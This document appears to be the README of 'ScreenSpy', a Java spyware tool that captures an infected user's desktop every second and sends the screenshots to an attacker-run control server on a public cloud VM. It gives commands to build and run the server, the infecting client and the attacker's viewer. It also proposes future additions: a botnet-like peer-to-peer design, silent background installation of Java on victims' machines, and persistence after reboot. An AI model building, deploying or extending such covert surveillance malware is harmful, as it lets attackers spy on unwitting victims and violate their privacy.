Introduction:

ScreenSpy is a cross-platform screen recording tool that runs on MacOSX, Windows and Linux. Once started, the tool will take screenshots of the user's desktop and send screenshots to a control server. An attacker can connect to the control server to see and record infected user's activities in real time.

Architecture:

The tool is written in a cross platform language and only uses standard libraries to allow maximum portability.

Using a publicly available central server allow the infected machine and attacker to operate on different networks from each other with the central server acting as a point of contact between attacker and infected machine. As long as both attacker and infected machine have access to Internet, they will be able to share screenshots.

The tool also handles network outages gracefully. If the connection is dropped for whatever reason, the tool will attempt to reconnect after a well defined time interval. 

Usage:

The control server needs to be installed on a globally accessible VM, such as Amazon AWS. It listens on port 8080 for incoming connections from infected clients and on port 8081 for incoming connections from the attacker.

To compile the control server from source (inside /src):

  javac ScreenSpyServer.java

To run the control server:

  java ScreenSpyServer

The screen recording client can be used to infect other machines. It connects to the control server and sends a screenshot every 1 second.

To compile the client from source (inside /src):

  javac ScreenSpyInfectedClient.java

To run the client:

  java ScreenSpyInfectedClient

The control client can be used by the attacker to connect to the control server and see screenshots of the infected machine in real time

To compile the client (inside /src):

  javac ScreenSpyReaderClient.java GUI.form GUI.java

To run the client

  java ScreenSpyReaderClient

Future Additions:

Currently, ScreenSpy has a single point of failure since it requires a centralized server to run, in the future, someone could work on having a peer to peer network to transmit screenshots which closely resembles a botnet.

Currently, we assume that Java is installed on the infected machine, however this is not always true. Going forward, someone should work on writing a script that automatically downloads and installs Java in the background if it is not present.

Currently, the program stops after restart. This can be fixed by adding a startup script that runs the code upon restart.



